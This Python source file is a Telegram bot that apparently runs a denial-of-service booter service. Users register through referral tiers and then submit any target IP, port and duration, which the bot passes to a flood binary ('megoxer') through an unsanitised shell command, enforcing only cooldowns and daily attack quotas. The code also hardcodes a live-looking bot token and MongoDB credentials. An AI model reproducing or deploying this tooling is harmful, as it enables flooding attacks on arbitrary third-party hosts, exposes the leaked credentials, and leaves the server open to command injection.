import os
import time
import telebot
import datetime
import subprocess
import threading
from telebot import types
from pymongo import MongoClient

# Load environment variables
BOT_TOKEN = "7535208222:AAHWh9BwtWudvz4wFCqEM27Js3cPVqAMttU"
ADMIN_ID = "1715564768"
CHANNEL_ID = "-1002118352544"

# MongoDB Connection
MONGO_URI = "mongodb+srv://Riyaz:Riyaz@riyazx.l7hnh.mongodb.net/?retryWrites=true&w=majority&appName=RiyazX"
client = MongoClient(MONGO_URI)
db = client["Riyaz"]  # Database name
users_collection = db["users"]  # Collection for users

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# Attack cooldown per user
COOLDOWN_PERIOD = 60

# Blocked Ports
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# Track last attack times and attack counts
last_attack_time = {}
daily_attack_count = {}

# Ensure user exists in the database
def ensure_user_exists(user_id):
    user_data = get_user_data(user_id)
    if not user_data:
        username = bot.get_chat(user_id).username or "No username"
        register_user(user_id, username)
    return get_user_data(user_id)

# Check if User is in Channel
def is_user_in_channel(user_id):
    try:
        chat_member = bot.get_chat_member(CHANNEL_ID, user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(f"Error checking channel membership: {e}")
        return False

# Force User to Join Channel
def force_user_to_join(user_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ JOIN PRIVATE CHANNEL", url="https://t.me/DariusXPro"))
    markup.add(types.InlineKeyboardButton("🔄 VERIFY", callback_data="verify_join"))
    
    bot.send_message(
        user_id,
        "🚫 *Access Denied* 🚫\n\nTo use this bot, you must join our **private channel**.\n\n"
        "Click the button below to join and then press '🔄 VERIFY' to continue.",
        reply_markup=markup
    )

# Handle Callback for 🔄 VERIFY Button
@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    user_id = call.message.chat.id
    if is_user_in_channel(user_id):
        bot.send_message(user_id, "✅ Verification successful! You can now use the bot.")
    else:
        bot.send_message(user_id, "❌ You are not a member of the channel. Please join and try again.")

# Register new user
def register_user(user_id, username, refer_code=None):
    user_data = {
        "user_id": user_id,
        "username": username,
        "role": "None",
        "referrals": [],
        "attack_count": 0,
        "last_attack_date": None
    }
    users_collection.insert_one(user_data)
    if refer_code:
        update_referral_system(refer_code, user_id)

# Update referral system
def update_referral_system(referral_code, new_user_id):
    referrer_data = users_collection.find_one({"user_id": referral_code})
    if referrer_data:
        users_collection.update_one({"user_id": referral_code}, {"$push": {"referrals": new_user_id}})
        update_user_role(referral_code)

# Update user role based on referrals
def update_user_role(user_id):
    user_data = get_user_data(user_id)
    referrals_count = len(user_data["referrals"])
    if referrals_count >= 3:
        update_user_data(user_id, {"role": "Gold"})
    elif referrals_count >= 1:
        update_user_data(user_id, {"role": "Silver"})
    elif referrals_count == 0 and user_data["role"] == "None":
        update_user_data(user_id, {"role": "Bronze"})

# Get user data
def get_user_data(user_id):
    return users_collection.find_one({"user_id": user_id})

# Update user data
def update_user_data(user_id, update_data):
    users_collection.update_one({"user_id": user_id}, {"$set": update_data})

# Handle /start command
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    user_data = get_user_data(user_id)

    if not user_data:
        # New user registration
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        markup.add(types.KeyboardButton("🎟️ Refer code"), types.KeyboardButton("🛡️ Without refer"))
        bot.reply_to(message, "Welcome! Please choose an option:", reply_markup=markup)
        bot.register_next_step_handler(message, process_registration_choice)
    else:
        # Existing user
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        markup.add(types.KeyboardButton("🚀 Attack"), types.KeyboardButton("👤 My Info"))
        if user_id == ADMIN_ID:
            markup.add(types.KeyboardButton("👻 Broadcast"))
        bot.reply_to(message, "Welcome back!", reply_markup=markup)

# Process registration choice
def process_registration_choice(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    choice = message.text

    if choice == "🎟️ Refer code":
        bot.reply_to(message, "Enter refer code:")
        bot.register_next_step_handler(message, process_refer_code)
    elif choice == "🛡️ Without refer":
        register_user(user_id, username)
        bot.reply_to(message, "You have been registered as a None user. You can now use the bot.")
        start_command(message)

# Process refer code
def process_refer_code(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    refer_code = message.text

    # Check if refer code is valid (e.g., exists in the database)
    referrer_data = users_collection.find_one({"user_id": refer_code})
    if referrer_data:
        register_user(user_id, username, refer_code)
        bot.reply_to(message, "You have been registered using a referral code. You can now use the bot.")
    else:
        bot.reply_to(message, "Invalid referral code. Please try again.")
    start_command(message)

# Handle 🚀 Attack command
@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    user_data = ensure_user_exists(user_id)
    
    if not is_user_in_channel(user_id):
        force_user_to_join(user_id)
        return

    # Check cooldown
    current_time = time.time()
    last_attack = last_attack_time.get(user_id, 0)
    remaining_cooldown = COOLDOWN_PERIOD - (current_time - last_attack)
    
    if remaining_cooldown > 0:
        bot.reply_to(message, f"⌛️ Cooldown in effect. Wait {int(remaining_cooldown)} seconds.")
        return

    # Check daily attack limit
    today = datetime.date.today().strftime("%Y-%m-%d")
    if user_data.get("last_attack_date") != today:
        user_data["attack_count"] = 0
        user_data["last_attack_date"] = today
        update_user_data(user_id, {"attack_count": 0, "last_attack_date": today})

    attack_limit = get_attack_limit(user_data["role"])
    if user_data["attack_count"] >= attack_limit:
        bot.reply_to(message, f"❌ You have reached your daily attack limit of {attack_limit} attacks.")
        return

    bot.reply_to(message, "Enter target IP, port, and duration (seconds), separated by spaces:")
    bot.register_next_step_handler(message, process_attack_details)

# Get attack limit based on role
def get_attack_limit(role):
    if role == "None":
        return 3
    elif role == "Bronze":
        return 4
    elif role == "Silver":
        return 5
    elif role == "Gold":
        return 6
    else:
        return 3

# Process Attack Details
def process_attack_details(message):
    user_id = str(message.chat.id)
    user_data = ensure_user_exists(user_id)
    details = message.text.split()

    if len(details) != 3:
        bot.reply_to(message, "Invalid format! Use: <target> <port> <duration>")
        return

    target, port, duration = details
    try:
        port = int(port)
        duration = int(duration)
    except ValueError:
        bot.reply_to(message, "❌ Invalid port or duration format!")
        return

    if port in BLOCKED_PORTS:
        bot.reply_to(message, "❌ This port is blocked!")
        return

    if duration > 240:
        bot.reply_to(message, "❌ Duration must be less than 240 seconds!")
        return

    # Update attack count and last attack time
    last_attack_time[user_id] = time.time()
    user_data["attack_count"] += 1
    update_user_data(user_id, {"attack_count": user_data["attack_count"]})

    # Start the Attack process in a separate thread
    attack_thread = threading.Thread(target=launch_attack, args=(user_id, target, port, duration, user_data["username"]))
    attack_thread.start()

    # Immediate response to the user
    response = (
        f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
        f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
        f"𝗧𝗶𝗺𝗲: {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
        f"𝗔𝘁𝘁𝗮𝗰𝗸𝘀 : {user_data['attack_count']}\n"
    )
    bot.reply_to(message, response)

# Launch Attack in a separate thread
def launch_attack(user_id, target, port, duration, username):
    subprocess.Popen(f"./megoxer {target} {port} {duration} 900", shell=True)
    time.sleep(duration)  # Wait for the attack to finish
    bot.send_message(user_id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 ✅")

# Handle 👤 My Info command
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info_command(message):
    user_id = str(message.chat.id)
    user_data = ensure_user_exists(user_id)
    
    status = "Active ✅" if is_user_in_channel(user_id) else "Inactive ❌"
    
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"🔖 𝗥𝗼𝗹𝗲: {user_data['role']}\n"
        f"📊 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
        f"🎉 𝗥𝗲𝗳𝗲𝗿𝗿𝗮𝗹 𝗖𝗼𝗱𝗲: {user_id}\n"
        f"👥 𝗧𝗼𝘁𝗮𝗹 𝗥𝗲𝗳𝗲𝗿𝗿𝗮𝗹𝘀: {len(user_data['referrals'])}\n"
        f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸𝘀 𝗧𝗼𝗱𝗮𝘆: {user_data['attack_count']}\n"
    )

    bot.reply_to(message, response)

# Handle 👻 Broadcast command (Admin only)
@bot.message_handler(func=lambda message: message.text == "👻 Broadcast" and str(message.chat.id) == ADMIN_ID)
def broadcast_command(message):
    bot.reply_to(message, "Please forward the message, photo, or video you want to broadcast.")
    bot.register_next_step_handler(message, process_broadcast)

# Process broadcast message
def process_broadcast(message):
    users = users_collection.find({})
    for user in users:
        try:
            if message.photo:
                bot.send_photo(user["user_id"], message.photo[-1].file_id, caption=message.caption)
            elif message.video:
                bot.send_video(user["user_id"], message.video.file_id, caption=message.caption)
            else:
                bot.send_message(user["user_id"], message.text)
        except Exception as e:
            print(f"Failed to send message to {user['user_id']}: {e}")

    bot.reply_to(message, "Broadcast sent successfully!")

# Handle /clear command (Admin only)
@bot.message_handler(commands=['clear'])
def clear_command(message):
    user_id = str(message.chat.id)
    
    # Check if the user is the admin
    if user_id == ADMIN_ID:
        # Delete all documents in the users_collection
        users_collection.delete_many({})
        bot.reply_to(message, "✅ All user data has been cleared.")
    else:
        bot.reply_to(message, "❌ You do not have permission to use this command.")

# Main loop
if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
        time.sleep(3)